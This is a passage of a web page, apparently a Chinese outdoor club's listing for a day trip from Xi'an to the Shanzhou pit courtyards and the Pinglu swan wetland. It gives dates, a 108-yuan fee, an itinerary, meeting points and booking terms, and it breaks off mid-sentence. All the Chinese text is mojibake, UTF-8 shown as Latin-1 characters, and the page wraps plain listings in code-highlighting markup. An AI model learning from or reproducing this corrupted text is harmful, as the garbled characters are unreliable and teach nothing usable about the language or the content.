ç¥å¥‡åœ°å‘é™¢<br><br>ç›®çš„åœ°ï¼š    å‘¨è¾¹çŸ­é€”<br><br>æ´»åŠ¨ç±»å‹ï¼š ä¼‘é—²è¡Œæ‘„ã€ æ‘„å½±ã€ ä¼‘é—²è¿åŠ¨<br></code></pre></td></tr></table></figure><p><strong>å‡ºå‘æ—¥æœŸï¼š</strong></p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs subunit">ç¬¬70æœŸ2023<span class="hljs-string">-12</span><span class="hljs-string">-30</span>(å‘¨å…­å‡ºå‘) è‡³ 2023<span class="hljs-string">-12</span><span class="hljs-string">-30</span>ï¿¥108æŠ¥åä¸­<br><br>ç¬¬71æœŸ2023<span class="hljs-string">-12</span><span class="hljs-string">-31</span>(å‘¨æ—¥å‡ºå‘) è‡³ 2023<span class="hljs-string">-12</span><span class="hljs-string">-31</span>ï¿¥108æŠ¥åä¸­<br><br>ç¬¬72æœŸ2024<span class="hljs-string">-01</span><span class="hljs-string">-01</span>(å‘¨ä¸€å‡ºå‘) è‡³ 2024<span class="hljs-string">-01</span><span class="hljs-string">-01</span>ï¿¥108æŠ¥åä¸­<br></code></pre></td></tr></table></figure><h2 id="ğŸ™‹é©¬ä¸Šé¢„å®š"><a href="#ğŸ™‹é©¬ä¸Šé¢„å®š" class="headerlink" title="ğŸ™‹é©¬ä¸Šé¢„å®š"></a><a href="https://www.029lvwo.com/outdoor/show_159.html">ğŸ™‹é©¬ä¸Šé¢„å®š</a></h2><hr><h2 id="ğŸ–¼ï¸æ´»åŠ¨äº®ç‚¹"><a href="#ğŸ–¼ï¸æ´»åŠ¨äº®ç‚¹" class="headerlink" title="ğŸ–¼ï¸æ´»åŠ¨äº®ç‚¹"></a>ğŸ–¼ï¸æ´»åŠ¨äº®ç‚¹</h2><p>è¿™é‡Œæ˜¯å±±è¥¿å¹³é™†é»„æ²³æ¹¿åœ°</p><p>æ˜¯ä¸­å›½é‡ç”Ÿå¤©é¹…ä¸‰å¤§è¶Šå†¬æ –æ¯åœ°ä¹‹ä¸€</p><p>æ¯å¹´ä»10æœˆä¸‹æ—¬åˆ°æ¥å¹´çš„3æœˆåˆ</p><p>æ¥è‡ªè¥¿ä¼¯åˆ©äºšçš„å¤©é¹…éƒ½ä¼šèµ¶æ¥æ –æ¯è¶Šå†¬</p><p><img src="https://i.miji.bid/2023/12/28/0f1f38d656c3fa820fbe3798e5cbf04b.jpeg" alt="1"></p><p>çœ¼ä¸‹ä¸Šä¸‡åªçš„å¤§å¤©é¹…</p><p>å·²é™†ç»­é£ä¸´å¹³é™†çš„ä¸‰æ¹¾é»„æ²³æ¹¿åœ°è¶Šå†¬</p><p>é»„æ²³æ¹¿åœ°ç¬é—´å˜æˆäº†ç¾ä¸½çš„â€œå¤©é¹…æ¹–â€</p><p>æ²³å²¸ã€æ°´ä¸Šã€ç©ºä¸­è¢«å®ƒä»¬å é¢†</p><p>è¿™äº›ç²¾çµçš„åˆ°æ¥</p><p>ä¸ç¾ä¸½çš„é»„æ²³æ¹¿åœ°é£å…‰ç›¸æ˜ æˆè¶£</p><p>ç¾ä¸½çš„æ¹¿åœ°é£å…‰å’Œå¤©é¹…</p><p>ç®€ç›´åˆ†åˆ†é’Ÿè¦é€¼ç–¯æ‘„å½±å¸ˆä»¬å•Š</p><p><img src="https://i.miji.bid/2023/12/28/e9f9345adde89e11bbc7bc7f37d9c025.jpeg" alt="2"></p><p><img src="https://i.miji.bid/2023/12/28/7c478c9b78c2afebf1383e96da3a0e32.jpeg" alt="3"></p><p>æ¯å¹´å†¬å­£éƒ½ä¼šæœ‰å¤§æ‰¹å¤©é¹…è¿å¾™äºæ­¤</p><p>äºé»„æ²³å²¸è¾¹æˆæ°´é£ç¿”</p><p>äºæ˜¯è¿™ä¸¤åº§åŸå¸‚çš†è‡ªç§°â€œå¤©é¹…ä¹‹ä¹¡â€</p><p>ä½†æ˜¯ä¸‰é—¨å³¡çš„å¤©é¹…åªèƒ½è¿œè¿œçš„è§‚æœ›</p><p>è€Œå¹³é™†ä¸‰æ¹¾çš„å¤©é¹…è¿‘åœ¨å’«å°º</p><p>å¤§å®¶èƒ½ä¸å¤©é¹…äº²å¯†æ¥è§¦</p><p>æ‰€ä»¥å—åˆ°æ¸¸å®¢å’Œæ‘„å½±çˆ±å¥½è€…çš„é’ç</p><p><img src="https://i.miji.bid/2023/12/28/3b55fbc383f2b2465db4036d32268a5b.jpeg" alt="4"></p><p><img src="https://i.miji.bid/2023/12/28/b68919d9317b7ab0e93786a9217695f0.jpeg" alt="5"></p><p><img src="https://i.miji.bid/2023/12/28/20535c994a4bd7d461ed6fb4e348e1d5.jpeg" alt="6"></p><p>åœ°å‘é™¢æ˜¯å…¨å›½ä¹ƒè‡³ä¸–ç•Œå”¯ä¸€çš„åœ°ä¸‹å¤æ°‘å±…å»ºç­‘</p><p>è¢«èª‰ä¸ºåœ°å¹³çº¿ä¸‹çš„å¤æ‘è½</p><p>äººç±»ç©´å±…çš„æ´»åŒ–çŸ³ã€åœ°ä¸‹çš„åŒ—äº¬å››åˆé™¢</p><p>æ˜¯æˆ‘å›½ç‰¹æœ‰çš„å››å¤§å¤æ°‘å±…å»ºç­‘ä¹‹ä¸€</p><p>æ®ä¸“å®¶è€ƒè¯,åœ°å‘é™¢æœ‰å…­åƒå¤šå¹´çš„å†å²</p><p>æ—©åœ¨åº™åº•æ²Ÿæ–‡åŒ–æ—¶æœŸå°±å·²ç»æœ‰äº†åœ°å‘é™¢çš„é›å½¢</p><p>20ä¸–çºªå‰æœŸï¼Œå¾·å›½äººé²é“å¤«æ–¯åŸºåœ¨</p><p>ã€Šæ²¡æœ‰å»ºç­‘å¸ˆçš„å»ºç­‘ã€‹ä¸€ä¹¦ä¸­å‘å…¨ä¸–ç•Œä»‹ç»äº†åœ°å‘é™¢</p><p><img src="https://i.miji.bid/2023/12/28/9855a9559a28a9b25b2527ba25f04a4a.jpeg" alt="7"></p><p><img src="https://i.miji.bid/2023/12/28/3dba13149145f8a3ab09425a9925030b.jpeg" alt="8"></p><p><img src="https://i.miji.bid/2023/12/28/cbc8445658487b92249c514c88e181ef.jpeg" alt="9"></p><hr><h2 id="ğŸŒè¡Œç¨‹å®‰æ’"><a href="#ğŸŒè¡Œç¨‹å®‰æ’" class="headerlink" title="ğŸŒè¡Œç¨‹å®‰æ’"></a>ğŸŒè¡Œç¨‹å®‰æ’</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs makefile">ç¬¬ä¸€å¤©            è¥¿å®‰-é™•å·åœ°å‘é™¢-å¹³é™†å¤©é¹…æ¹–-è¥¿å®‰<br><br>ğŸ—ºï¸æ™¯ç‚¹ï¼šé™•å·åœ°å‘é™¢ å¹³é™†å¤©é¹…æ¹–<br><br>ğŸœç”¨é¤æƒ…å†µï¼šåˆé¤å’Œé¥®ç”¨æ°´è‡ªç†ğŸšŒäº¤é€šå·¥å…·ï¼šå¤§å·´<br><br>â‘ æ—©ä¸Š7ç‚¹å—ç¨é—¨åœ°é“ç«™Få£å¤„é›†åˆ(åœ°é“2å·ã€5å·çº¿å—ç¨é—¨ç«™)ï¼Œæ²¿é€”ä¹˜è½¦ç‚¹æ¥äººå‡ºå‘<br><br>â‘¡é¢†é˜Ÿè½¦ä¸Šä»‹ç»æ´»åŠ¨å†…å®¹å’Œç›¸å…³æ³¨æ„äº‹é¡¹ï¼Œä¸€è·¯æ¬¢å£°ç¬‘è¯­å‰å¾€ç›®çš„åœ°<br><br><span class="hljs-section">â‘¢11:00å·¦å³åˆ°è¾¾é™•å·åœ°å‘é™¢ï¼Œæ¸¸è§ˆç¥å¥‡ç‰¹è‰²çš„åœ°å‘é™¢è½ï¼Œå“å°å½“åœ°ç‰¹è‰²ç¾é£Ÿ</span><br><br><span class="hljs-section">â‘£14:00å·¦å³å‰å¾€å¹³é™†å¤©é¹…åŸºåœ°æ™¯åŒºï¼Œè¿‘è·ç¦»æ‹æ‘„å¯çˆ±çš„å¤§å¤©é¹…</span><br><br><span class="hljs-section">â‘¤16:30å·¦å³é›†åˆè¿”ç¨‹é¢„è®¡æ™š9ç‚¹å·¦å³è¾¾åˆ°è¥¿å®‰ç»“æŸæ„‰å¿«çš„æ—…è¡Œ</span><br><br><br><br>æ´»åŠ¨è¯´æ˜ï¼š<br><br>è·¯çº¿ç±»å‹ï¼šä¼‘é—²è¡Œæ‘„çº¿è·¯<br><br>è¡Œç¨‹è·ç¦»ï¼šåŸºæœ¬æ— å¼ºåº¦ï¼Œä¼‘é—²æ‘„å½±<br><br>é€‚åˆäººç¾¤ï¼šé€‚åˆèº«å¿ƒå¥åº·è€…<br><br>è£…å¤‡è¦æ±‚ï¼šæŒ‰è¥¿å®‰æ¸©åº¦ç€è£…å³å¯<br><br>è¡Œç¨‹é¤é¥®ï¼šåˆé¥­å’Œé¥®ç”¨æ°´å»ºè®®é€‚é‡è‡ªå¤‡ï¼Œæœ‰å–åƒçš„ï¼Œé…Œæƒ…æºå¸¦<br><br>å…¶      ä»–ï¼šä¸ªäººå¸¸å¤‡è¯å“ï¼Œåƒåœ¾è¢‹ï¼Œä¸ªäººå¸¸ç”¨ç‰©å“ç­‰<br></code></pre></td></tr></table></figure><hr><h2 id="ğŸ’´è´¹ç”¨è¯´æ˜"><a href="#ğŸ’´è´¹ç”¨è¯´æ˜" class="headerlink" title="ğŸ’´è´¹ç”¨è¯´æ˜"></a>ğŸ’´è´¹ç”¨è¯´æ˜</h2><h3 id="æ´»åŠ¨è´¹ç”¨"><a href="#æ´»åŠ¨è´¹ç”¨" class="headerlink" title="æ´»åŠ¨è´¹ç”¨"></a>æ´»åŠ¨è´¹ç”¨</h3><p><strong>108å…ƒ&#x2F;äºº</strong></p><h3 id="è´¹ç”¨åŒ…å«"><a href="#è´¹ç”¨åŒ…å«" class="headerlink" title="è´¹ç”¨åŒ…å«"></a>è´¹ç”¨åŒ…å«</h3><table><thead><tr><th><strong>ç”¨è½¦</strong></th><th><strong>è¥¿å®‰èµ·æ­¢å¾€è¿”æ—…æ¸¸å·´å£«è´¹ç”¨</strong></th></tr></thead><tbody><tr><td><strong>ä¿é™©</strong></td><td><strong>æ—…è¡Œç¤¾è´£ä»»é™©+èµ é€æ—…è¡Œæ„å¤–é™©</strong></td></tr><tr><td><strong>é¢†é˜Ÿ</strong></td><td><strong>å…¨ç¨‹é©´çªé¢†é˜ŸæœåŠ¡+æ™¯åŒºè®²è§£è´¹</strong></td></tr><tr><td><strong>å…¶ä»–</strong></td><td><strong>å…¶ä»–æ´»åŠ¨ç»„ç»‡æˆæœ¬è´¹åŠå…±ç”¨è®¾å¤‡è´¹ç”¨ï¼Œä¸€æ—¥æ¸¸è½¦ä¸Šç¼´è´¹</strong></td></tr></tbody></table><h3 id="è´¹ç”¨ä¸å«"><a href="#è´¹ç”¨ä¸å«" class="headerlink" title="è´¹ç”¨ä¸å«"></a>è´¹ç”¨ä¸å«</h3><table><thead><tr><th><strong>ç”¨é¤</strong></th><th><strong>åˆé¤å’Œé¥®ç”¨æ°´è‡ªç†ï¼Œåœ°å‘é™¢æœ‰å–åƒçš„ï¼Œå¯ä»¥é…Œæƒ…æºå¸¦</strong></th></tr></thead><tbody><tr><td><strong>é—¨ç¥¨</strong></td><td><strong>å…¨ç¨‹é—¨ç¥¨è´¹ç”¨è‡ªç†ï¼ˆé™•å·åœ°å‘é™¢é—¨ç¥¨70å…ƒï¼Œå›¢é˜Ÿ30å…ƒï¼›å¤©é¹…æ¹–æš‚æ— é—¨ç¥¨ï¼ˆæ ¹æ®å®é™…æ”¿ç­–ä¸ºå‡†ï¼‰ï¼Œä»¥å®é™…äº§ç”Ÿä¸ºå‡†ï¼Œç›¸å…³ä¼˜æƒ è¯ä»¶å¯äº«å—æ™¯åŒºè§„å®šä¼˜æƒ ï¼‰</strong></td></tr><tr><td><strong>å…¶ä»–</strong></td><td><strong>å…¶ä»–ä¸ªäººæ¶ˆè´¹ç­‰</strong></td></tr></tbody></table><h3 id="ç‰¹åˆ«è¯´æ˜"><a href="#ç‰¹åˆ«è¯´æ˜" class="headerlink" title="ç‰¹åˆ«è¯´æ˜"></a>ç‰¹åˆ«è¯´æ˜</h3><table><thead><tr><th><strong>ä¼˜æƒ </strong></th><th><strong>å…³æ³¨â€œé©´çªæˆ·å¤–â€å¾®ä¿¡å…¬ä¼—å·ï¼Œå¾®ä¿¡åˆ†äº«æœ¬æ´»åŠ¨è‡³æœ‹å‹åœˆå¯äº«å—5å…ƒä¼˜æƒ ï¼ˆå‡ºå‘å½“å¤©å’Œä»¥ååˆ†äº«æ— æ•ˆï¼‰ï¼</strong></th></tr></thead><tbody><tr><td><strong>å…¶ä»–</strong></td><td><strong>å„¿ç«¥å¿…é¡»æŠ¥åå åº§ï¼Œå›¢è´¹åŒæˆäººå¯æŒ‰åˆ†äº«ä¼˜æƒ ï¼Œé—¨ç¥¨åŠå…¶ä»–å®é™…äº§ç”Ÿä¸ºå‡†</strong></td></tr></tbody></table><h3 id="é›†åˆåœ°ç‚¹"><a href="#é›†åˆåœ°ç‚¹" class="headerlink" title="é›†åˆåœ°ç‚¹"></a>é›†åˆåœ°ç‚¹</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">07</span>:<span class="hljs-number">00</span>å—ç¨é—¨åå­—è¥¿å—è§’ï¼ˆåœ°é“ç«™Få£ï¼‰<br><br><span class="hljs-attribute">07</span>:<span class="hljs-number">10</span>å¤ªä¹™è·¯ç«‹äº¤ï¼ˆé“ä¸€å±€åŒ»é™¢å¯¹é¢å…¬äº¤ç«™ï¼‰<br><br><span class="hljs-attribute">07</span>:<span class="hljs-number">20</span>é•¿ä¹å…¬å›­åœ°é“ç«™Cå£<br><br><span class="hljs-attribute">07</span>:<span class="hljs-number">25</span>è¥¿å…‰å‚é—¨å£è·¯å—å¤©æ¡¥ä¸‹ï¼ˆä¸‡å¯¿è·¯åœ°é“ç«™Bå£ï¼‰<br><br><span class="hljs-attribute">07</span>:<span class="hljs-number">35</span>å ¡å­æ‘è½¬ç›˜å‘ä¸œæ–¹å‘ï¼ˆåŠå¡åœ°é“ç«™Då£<span class="hljs-number">4</span>å·å‡ºç«™å£è·¯è¾¹ï¼‰<br></code></pre></td></tr></table></figure><h3 id="ç‰¹åˆ«æé†’"><a href="#ç‰¹åˆ«æé†’" class="headerlink" title="ç‰¹åˆ«æé†’"></a>ç‰¹åˆ«æé†’</h3><p>å¹´é¾„åœ¨8å²ä»¥ä¸‹æˆ–è¶…è¿‡70å²,è¯·å…ˆå’¨è¯¢å®¢æœæˆ–é¢†é˜Ÿæ´»åŠ¨å¼ºåº¦åå†è¿›è¡ŒæŠ¥åï¼</p><h3 id="æŠ¥åæµç¨‹"><a href="#æŠ¥åæµç¨‹" class="headerlink" title="æŠ¥åæµç¨‹"></a>æŠ¥åæµç¨‹</h3><p><strong>1.é˜…è¯»è¡Œç¨‹ï¼š</strong>è¯·è¯¦ç»†é˜…è¯»æ´»åŠ¨å†…å®¹,è¡Œç¨‹å®‰æ’åŠæ´»åŠ¨å¼ºåº¦ç­‰äº‹é¡¹</p><p><strong>2.æŠ¥åä¿¡æ¯ï¼š</strong>æŒ‰è¦æ±‚å¡«å†™&#x2F;æä¾›æŠ¥åä¿¡æ¯ï¼Œè¿›è¡Œé¢„æŠ¥åï¼Œæç¤ºæˆåŠŸåç­‰å¾…æˆå›¢çŸ­ä¿¡é€šçŸ¥ï¼</p><p><strong>3.å‡ºè¡Œé€šçŸ¥ï¼š</strong>æ´»åŠ¨å‡ºè¡Œå‰ä¸€å¤©ä¸‹åˆ17ï¼š00å·¦å³å‘â€œå‡ºè¡ŒçŸ­ä¿¡â€ï¼Œç¾¤å‘çŸ­ä¿¡ä¿¡æ¯æœ‰å»¶è¿Ÿç°è±¡ï¼›å¦å¤–ä¸å°‘æ™ºèƒ½æ‰‹æœºæœ‰çŸ­ä¿¡å±è”½åŠŸèƒ½ï¼Œè¯·åŠæ—¶åˆ°åƒåœ¾ç®±æ‰¾å¯»ï¼Œå¦‚æœªæ”¶åˆ°ä¿¡æ¯åŠæ—¶è”ç³»æˆ‘ä»¬å·¥ä½œäººå‘˜ã€‚</p><p><strong>4.åŠ æ´»åŠ¨ç¾¤ï¼š</strong>æ¥åˆ°å‡ºè¡Œé€šçŸ¥åï¼Œè¯·åœ¨ä¸ªäººä¸­å¿ƒçš„è®¢å•ä¸­é€‰æ‹©åŠ å…¥æœ¬æ¬¡æ´»åŠ¨ç¾¤ï¼Œæ–¹ä¾¿æ¥æ”¶é€šçŸ¥ï¼Œæˆ–è”ç³»å®¢æœé‚€è¯·å…¥ç¾¤ã€‚</p><p><strong>5.æˆå›¢è¯´æ˜ï¼š</strong>æ ¹æ®æ´»åŠ¨å…·ä½“æŠ¥åæƒ…å†µå’Œå¤©æ°”ï¼Œæœ‰å­˜åœ¨ä¸æˆå›¢çš„å¯èƒ½ï¼Œå¦‚ä¸å¤Ÿæˆå›¢äººæ•°æˆ–å¤©æ°”å› ç´ ï¼Œ1-2æ—¥æ´»åŠ¨è·å‡ºå‘ä¹‹æ—¶12å°æ—¶æœªèƒ½è¾¾åˆ°æˆå›¢äººæ•°ï¼Œ2æ—¥ä»¥ä¸Šæ´»åŠ¨è·å‡ºå‘ä¹‹æ—¶3æ—¥æœªèƒ½è¾¾åˆ°æˆå›¢äººæ•°ï¼Œæœ¬æ¬¡æ´»åŠ¨å¯èƒ½å»¶æœŸæˆ–å–æ¶ˆï¼Œä¹Ÿå¯åè°ƒå…¶ä»–æˆå›¢æ´»åŠ¨ï¼Œå¦‚å·²ç¼´è´¹å¯å…¨é¢ç”³è¯·é€€æ¬¾ï¼Œä½†ä¸åšæ´»åŠ¨èµ”å¿ï¼ŒæŠ¥åè§†ä¸ºåŒæ„æˆå›¢è¯´æ˜ï¼Œæœ›å‘¨çŸ¥ï¼</p><p><img src="https://i.miji.bid/2023/12/28/5a6127bf533903e0bea93212b7a8b7bf.png" alt="5a6127bf533903e0bea93212b7a8b7bf"></p><hr><h2 id="ğŸ“‘é¢„å®šé¡»çŸ¥"><a href="#ğŸ“‘é¢„å®šé¡»çŸ¥" class="headerlink" title="ğŸ“‘é¢„å®šé¡»çŸ¥"></a><strong>ğŸ“‘é¢„å®šé¡»çŸ¥</strong></h2><h3 id="æ´»åŠ¨æé†’"><a href="#æ´»åŠ¨æé†’" class="headerlink" title="æ´»åŠ¨æé†’"></a>æ´»åŠ¨æé†’</h3><p>**1.**å‡ºé—¨æ—…è¡Œéƒ½æœ‰ä¸€å®šçš„å±é™©æ€§ï¼Œè¯·é˜Ÿå‹å……åˆ†è€ƒè™‘è¿™ä¸€ç‚¹ï¼Œå‡¡æŠ¥åå‚åŠ è€…å‡è§†ä¸ºå…·æœ‰å®Œå…¨æ°‘äº‹è¡Œä¸ºèƒ½åŠ›äººæˆ–å·²ç»è¿‡å…¶æ³•å®šä»£ç†äººåŒæ„å‚ä¸æœ¬æ¬¡æ´»åŠ¨ï¼Œå‡¡æŠ¥åè€…å‡è§†ä¸ºæ¥å—å®˜ç½‘å¹³å°å…¬ç¤ºçš„æœ¬æ¬¡æ´»åŠ¨ç›¸å…³è¡Œç¨‹å’Œè¯´æ˜ã€‚</p><p>**2.**å‚ä¸è€…éœ€èº«ä½“å¥åº·ï¼Œè¯·å‚ä¸è€…ç»¼åˆè€ƒè™‘è‡ªèº«å¥åº·çŠ¶å†µåŠæœ¬æ¬¡æ´»åŠ¨å¼ºåº¦ç»¼åˆè€ƒè™‘æ˜¯å¦å‚ä¸æœ¬æ¬¡æ´»åŠ¨ï¼Œå¦‚æœ‰ç–¾ç—…åº”åœ¨æ´»åŠ¨å‰å¦‚å®å‘ŠçŸ¥é¢†é˜Ÿæˆ–å·¥ä½œäººå‘˜ï¼Œå¾å¾—åŒæ„åæ–¹å¯ç»§ç»­å‚åŠ æ´»åŠ¨ã€‚æ´»åŠ¨è¿‡ç¨‹ä¸­ï¼Œé¢†é˜Ÿæœ‰æƒæ ¹æ®å‚ä¸è€…ä¸ªäººèº«ä½“çŠ¶å†µå†³å®šå…¶èƒ½å¦ç»§ç»­å‚åŠ æœ¬æ¬¡æ´»åŠ¨è¡Œç¨‹ï¼Œå‚ä¸è€…å¿…é¡»é…åˆã€‚</p><p>**3.**æœ¬æ¬¡æ´»åŠ¨èµ é€æ—…è¡Œäººèº«æ„å¤–ä¼¤å®³ä¿é™©ï¼Œè¯·æŠ¥åæ—¶ä¸»åŠ¨æä¾›æ‰€æŠ¥äººå‘˜çš„çœŸå®å§“åå’Œè¯ä»¶å·ç ï¼Œä¸æä¾›å®Œæ•´ä¿¡æ¯è§†ä¸ºæ”¾å¼ƒæŠ•ä¿ï¼Œé£é™©è‡ªå·±æ‰¿æ‹…ï¼ä¸”ä¸åšé€€è´¹å¤„ç†ï¼å½“å·²æŠ•ä¿çš„é˜Ÿå‘˜å‘ç”Ÿæ„å¤–ä¼¤å®³æ—¶ï¼Œå…¬å¸å°†å°½å…¨åŠ›åè°ƒä¿é™©å…¬å¸è¿›è¡Œä¿é™©ç†èµ”ã€‚å¦‚ä¸ªäººè‡ªèº«åŸå› ã€ç¬¬ä¸‰æ–¹åŸå› ä»¥åŠä¸å¯æŠ—åŠ›ï¼ˆå¦‚åœ°éœ‡ã€æ´ªæ°´ã€å¡Œæ–¹ç­‰è‡ªç„¶ç¾å®³ï¼‰é€ æˆå…¶è‡ªèº«äººèº«ã€è´¢äº§æŸå®³çš„ï¼Œæœ¬å…¬å¸å‡ä¸æ‰¿æ‹…è´£ä»»ã€‚</p><p>**4.**æ ¹æ®ç›¸å…³è§„å®šï¼Œä¸æ¥å—æœªæˆå¹´äººå•ç‹¬æŠ¥åå‚åŠ æ´»åŠ¨ï¼Œæœªæ»¡18å‘¨å²éœ€ç”±ç›‘æŠ¤äººå¸¦é¢†ï¼Œå¹¶å…¨ç¨‹ç”±ç›‘æŠ¤äººè´Ÿè´£ç…§é¡¾ï¼›åŒæ—¶äº¤é€šæ³•ä¹Ÿè§„å®š1.2ç±³ä»¥ä¸‹å°æœ‹å‹éœ€è¦å®‰æ’ç‹¬ç«‹åº§ä½ï¼Œæ‰€ä»¥ä¹Ÿéœ€è¦ç¼´çº³æ­£å¸¸æ´»åŠ¨è´¹ç”¨ï¼ˆå…¶ä»–æœªäº§ç”Ÿçš„æˆ‘ä»¬è¿›è¡Œç›¸åº”é€€è´¹ï¼‰ï¼Œè¯·ç†è§£å¹¶ç»™äºˆåˆä½œï¼Œè°¢è°¢ï¼</p><p>**5.**æˆ‘ä»¬çš„æ´»åŠ¨ä¸åŒäºä¼ ç»Ÿæ—…æ¸¸çº¿è·¯ï¼Œå¯¹å‚åŠ å›¢å‘˜çš„å®‰å…¨ã€ç¯ä¿ã€æ¶ˆé˜²æ„è¯†åŠå›¢é˜Ÿåä½œç²¾ç¥è¦æ±‚è¾ƒé«˜ã€‚è¯·ä¿æŒä¸€é¢—æ—…è¡Œè€…çš„å®½å®¹å¿ƒæ€é¢å¯¹æ—…è¡Œä¸­çš„ä¸€åˆ‡ï¼Œåœ¨æ´»åŠ¨è¿‡ç¨‹ä¸­ç›¸äº’å¸®åŠ©ã€ç›¸äº’ç†è§£ï¼Œä¸ºç¾å¥½çš„ä¸€æ¬¡æ—…ç¨‹è´¡çŒ®è‡ªå·±çš„ä¸€ä»½åŠ›é‡ï¼</p><p>**6.**å‚å›¢äººå‘˜åº”å……åˆ†äº†è§£æœ¬å›¢é˜Ÿæ€§è´¨(è‡ªåŠ©æ¸¸)ï¼Œæ²¡æœ‰å›ºå®šçš„æœåŠ¡æ¨¡å¼å’Œæ ‡å‡†ï¼Œæ´»åŠ¨çº¯å±åŠè‡ªåŠ©æ¸¸ï¼ŒæœŸé—´è‹¥å› ä¸å¯æŠ—åŠ›å› ç´ ï¼ˆæ¶åŠ£å¤©æ°”ã€å µè½¦ã€åè½¦ç­‰ï¼‰å¯¼è‡´è¡Œç¨‹å—é˜»ï¼Œå…¬å¸åŠé¢†é˜Ÿæœ‰æƒæ ¹æ®å½“åœ°å®é™…æƒ…å†µå¯¹è¡Œç¨‹è¿›è¡Œæ›´æ”¹ï¼Œè¯·é…åˆï¼Œä¸”ä¿æŒä¸€ä»½å¹³å¸¸å¿ƒï¼Œå¤šä¸€ç‚¹è°…è§£ï¼Œå¤šä¸€ç‚¹å®½å®¹ï¼Œäº‰å–æ´»åŠ¨çš„åœ†æ»¡å®Œæˆï¼›</p><p>**7.**è¡Œç¨‹è¿‡ç¨‹ä¸­ï¼Œæœä»é¢†é˜Ÿç®¡ç†ï¼Œå¦‚æ— ç‰¹æ®Šæƒ…å†µä¸¥ç¦æ“…è‡ªè„±å›¢ï¼Œè‡ªç”±æ´»åŠ¨ï¼å¦‚å› ä¸ªäººåŸå› éœ€ä¸­é€”é€€å‡ºï¼ŒåŠ¡å¿…å‘ŠçŸ¥é¢†é˜Ÿï¼Œç¦»é˜Ÿå‰åˆ™éœ€ç­¾ç½²ä¹¦é¢çš„ç¦»é˜Ÿè„±å›¢åè®®ï¼Œç¦»é˜Ÿåçš„ä¸€åˆ‡å®‰å…¨è´£ä»»å’Œè´¹ç”¨å‡ç”±ä¸ªäººè‡ªè¡Œæ‰¿æ‹…ã€‚ å‡ºæ¸¸è¿‡ç¨‹ä¸­ï¼Œå¦‚äº§ç”Ÿé€€è´¹æƒ…å†µï¼Œé€€è´¹é¡¹ç›®ä»¥æ—…è¡Œç¤¾æŠ˜æ‰£ä»·ä¸ºä¾æ®ï¼Œå‡ä¸ä»¥æŒ‚ç‰Œä»·ä¸ºå‡†ã€‚æ“…è‡ªç¦»é˜Ÿè„±é˜Ÿè€…åˆ™è§†ä¸ºè‡ªæ„¿è§£é™¤æœ¬æ¬¡æ´»åŠ¨å½¢æˆçš„åˆåŒæ³•å¾‹å…³ç³»ï¼Œæœ¬å…¬å¸ä¸å†å¯¹å…¶æ‰¿æ‹…è´£ä»»ï¼Œå·²æ”¶è´¹ç”¨ä¸äºˆé€€è¿˜ï¼</p><p>**8.**å› äº¤é€šå»¶é˜»ã€ç½¢å·¥ã€æ”¿å˜ã€å¤©æ°”ã€é£æœºã€ç«è½¦æ•…éšœã€æ™¯ç‚¹å…³é—­ã€èˆªç­å–æ¶ˆæˆ–æ›´æ”¹æ—¶é—´ç­‰ä¸å¯æŠ—åŠ›å› ç´ æ‰€å¼•è‡´çš„é¢å¤–è´¹ç”¨ï¼Œç”±æ¸¸å®¢æ‰¿æ‹…ï¼Œå‡å°‘æˆ–æ²¡æœ‰äº§ç”Ÿçš„è´¹ç”¨å…¨é¢é€€è¿˜ã€‚</p><p>**9.**å›½å†…æ¸¸æ´»åŠ¨çš„ä½å®¿å®‰æ’ä¸€èˆ¬ä¸ºä¸¤äººä¸€æ ‡é—´ï¼ˆå³1äºº1ä¸ªåºŠä½ï¼Œè¡Œç¨‹ä¸­è¡¨æ˜å¤šäººé—´çš„é™¤å¤–ï¼‰ï¼Œå¦‚å‡ºç°å•ç”·å•å¥³ï¼Œæˆ‘ä»¬å°½é‡å®‰æ’è¯¥å®¢äººä¸å…¶ä»–åŒæ€§åˆ«å›¢å‹æ‹¼æˆ¿ï¼›å¦‚ä¸æ„¿æ‹¼æˆ¿ï¼Œè¯·è¡¥é½å•æˆ¿å·®ä»¥äº«ç”¨æ•´ä¸ªæˆ¿é—´ã€‚å¦‚å•äººæŠ¥åè¦æ±‚å•ç‹¬ä½ä¸€ä¸ªæˆ¿é—´çš„ï¼Œéœ€è‡´ç”µå®¢æœç¡®è®¤æ˜¯å¦èƒ½å®‰æ’ï¼Œå•æˆ¿å·®è‡ªç†ã€‚å¦‚ä¸¤äººæŠ¥åè¦æ±‚ç”·å¥³ä¸€èµ·æŠ¥åçš„ï¼Œå¦‚ä¸èƒ½åŒä½ä¸€é—´æˆ¿çš„ï¼Œéœ€åœ¨æŠ¥åæ—¶å¤‡æ³¨æ å†…å¤‡æ³¨æ¸…æ¥šã€‚</p><p>**10.**æ´»åŠ¨æœŸé—´å¦‚è®¤ä¸ºæœ¬ä¿±ä¹éƒ¨è¡Œä¸ºå­˜åœ¨è¿åè¡Œç¨‹çº¦å®šçš„æƒ…å†µæ—¶ï¼Œåº”ç«‹å³å‘é¢†é˜Ÿåæ˜ 